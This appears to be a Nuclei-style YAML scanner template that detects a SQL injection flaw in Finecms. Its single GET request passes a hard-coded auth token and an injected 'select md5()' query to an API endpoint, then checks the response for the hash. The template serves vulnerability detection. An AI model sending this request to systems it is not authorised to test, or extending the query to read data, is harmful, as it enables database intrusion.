id: poc-yaml-finecms-sqli

info:
  name: Finecms SQL Injection Vulnerability
  author: ProjectDiscoveryAI
  severity: medium
  tags: sql-injection
  description: |
    Detects SQL injection vulnerability in Finecms that allows execution of arbitrary SQL queries.

variables:
  rand: "{{rand_int(10000, 21000)}}"

http:
  - method: GET
    path:
      - "/index.php?c=api&m=data2&auth=582f27d140497a9d8f048ca085b111df&param=action=sql%20sql=%27select%20md5({{rand}})%27"
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "{{md5(rand)}}"
        part: body
